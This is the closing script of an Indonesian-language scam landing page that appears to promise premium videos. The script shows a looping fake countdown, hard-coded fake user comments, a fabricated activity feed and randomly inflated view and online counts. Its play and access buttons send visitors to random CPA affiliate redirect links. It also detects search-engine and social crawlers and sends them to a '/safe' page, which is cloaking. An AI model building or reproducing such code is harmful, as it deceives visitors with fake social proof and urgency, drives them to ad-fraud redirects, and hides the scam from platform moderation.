    <script>
        // Timer countdown
        let timeLeft = 89;
        const countdownElement = document.getElementById('countdown');
        
        function updateTimer() {
            if (countdownElement) {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }
            
            if (timeLeft > 0) {
                timeLeft--;
            } else {
                timeLeft = 89;
            }
        }
        
        setInterval(updateTimer, 1000);

        // CPA redirect links
        const cpaLinks = [
            'https://librarysituation.com/t541uafu?key=51741796b26deef781617a004544e931',
            'https://librarysituation.com/d3jimmiva?key=58bf719770c962a1b202e6472641a4c9',
            'https://librarysituation.com/vrqw4rme6?key=87ba4b429e7bb71c4adf5532eb6203cc'
        ];

        function getRandomCPALink() {
            return cpaLinks[Math.floor(Math.random() * cpaLinks.length)];
        }

        // Fake comments data
        const fakeComments = [
            { author: "Ahmad_99", text: "Wah mantap banget videonya! Kualitas HD benar-benar jernih üî•", likes: 234, time: "2 menit lalu" },
            { author: "Sarah_ID", text: "Akhirnya nemu yang berkualitas! Thanks admin üëç", likes: 189, time: "5 menit lalu" },
            { author: "Budi_Jakarta", text: "Koleksi terlengkap memang di sini. Recommended!", likes: 156, time: "8 menit lalu" },
            { author: "Rina_Bdg", text: "Loading cepat banget, ga ada buffering sama sekali", likes: 203, time: "12 menit lalu" },
            { author: "Doni_Sby", text: "Premium quality memang beda ya. Worth it!", likes: 178, time: "15 menit lalu" },
            { author: "Maya_Jkt", text: "Udah lama nyari yang kayak gini. Finally! üòç", likes: 267, time: "18 menit lalu" },
            { author: "Rizki_ID", text: "Kualitas 4K nya mantap banget. Jernih poll!", likes: 145, time: "22 menit lalu" },
            { author: "Siti_Medan", text: "Ga nyesel deh akses di sini. Koleksinya lengkap", likes: 198, time: "25 menit lalu" }
        ];

        // Activity feed data
        const activities = [
            "User_123 baru saja menonton video premium",
            "Sarah_ID memberikan rating 5 bintang",
            "Ahmad_99 menambahkan ke favorit",
            "Budi_Jakarta berbagi ke teman",
            "Rina_Bdg mengunduh video HD",
            "Doni_Sby memberikan like",
            "Maya_Jkt bergabung sebagai member premium",
            "Rizki_ID mengomentari video"
        ];

        function generateComments() {
            const container = document.getElementById('commentsContainer');
            if (container) {
                let html = '';
                
                fakeComments.forEach(comment => {
                    const initial = comment.author.charAt(0).toUpperCase();
                    html += `
                        <div class="comment">
                            <div class="comment-avatar">${initial}</div>
                            <div class="comment-content">
                                <div class="comment-author">${comment.author}</div>
                                <div class="comment-text">${comment.text}</div>
                                <div class="comment-meta">
                                    <span class="comment-time">${comment.time}</span>
                                    <span class="comment-likes">üëç ${comment.likes}</span>
                                </div>
                            </div>
                        </div>
                    `;
                });
                
                container.innerHTML = html;
            }
        }

        function addActivity() {
            const feed = document.getElementById('activityFeed');
            if (feed) {
                const activity = activities[Math.floor(Math.random() * activities.length)];
                const username = activity.split(' ')[0];
                const initial = username.charAt(0).toUpperCase();
                
                const activityHTML = `
                    <div class="activity-item">
                        <div class="activity-avatar">${initial}</div>
                        <div class="activity-text">${activity}</div>
                        <div class="activity-time">Baru saja</div>
                    </div>
                `;
                
                feed.insertAdjacentHTML('afterbegin', activityHTML);
                
                // Remove old activities (keep only 3)
                const items = feed.querySelectorAll('.activity-item');
                if (items.length > 3) {
                    items[items.length - 1].remove();
                }
            }
        }

        function updateStats() {
            const viewCount = document.getElementById('viewCount');
            const onlineCount = document.getElementById('onlineCount');
            const videoViews = document.getElementById('videoViews');
            const videoLikes = document.getElementById('videoLikes');
            
            if (viewCount) {
                let current = parseInt(viewCount.textContent.replace(/,/g, ''));
                viewCount.textContent = (current + Math.floor(Math.random() * 10)).toLocaleString();
            }
            
            if (onlineCount) {
                let current = parseInt(onlineCount.textContent.replace(/,/g, ''));
                let change = Math.floor(Math.random() * 21) - 10;
                onlineCount.textContent = Math.max(1000, current + change).toLocaleString();
            }
            
            if (videoViews) {
                let current = parseInt(videoViews.textContent.split(' ')[0].replace(/,/g, ''));
                videoViews.textContent = `${(current + Math.floor(Math.random() * 5)).toLocaleString()} views`;
            }
            
            if (videoLikes) {
                let current = parseInt(videoLikes.textContent.split(' ')[0].replace(/,/g, ''));
                videoLikes.textContent = `${(current + Math.floor(Math.random() * 3)).toLocaleString()} likes`;
            }
        }

        // Play button functionality
        const playButton = document.getElementById('playButton');
        if (playButton) {
            playButton.addEventListener('click', function() {
                const loadingOverlay = document.getElementById('loadingOverlay');
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'flex';
                    
                    setTimeout(() => {
                        window.open(getRandomCPALink(), '_blank');
                        if (loadingOverlay) {
                            loadingOverlay.style.display = 'none';
                        }
                    }, 2000);
                }
            });
        }

        // CTA button functionality
        const accessButton = document.getElementById('accessButton');
        if (accessButton) {
            accessButton.addEventListener('click', function() {
                window.open(getRandomCPALink(), '_blank');
            });
        }

        // User agent detection for cloaking
        const userAgent = navigator.userAgent.toLowerCase();
        const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|rogerbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest|slackbot|vkshare|w3c_validator/i.test(userAgent);
        
        if (isBot) {
            window.location.href = '/safe';
        }

        // Initialize
        generateComments();
        setInterval(addActivity, 8000); // Add new activity every 8 seconds
        setInterval(updateStats, 3000); // Update stats every 3 seconds
    </script>
</body>
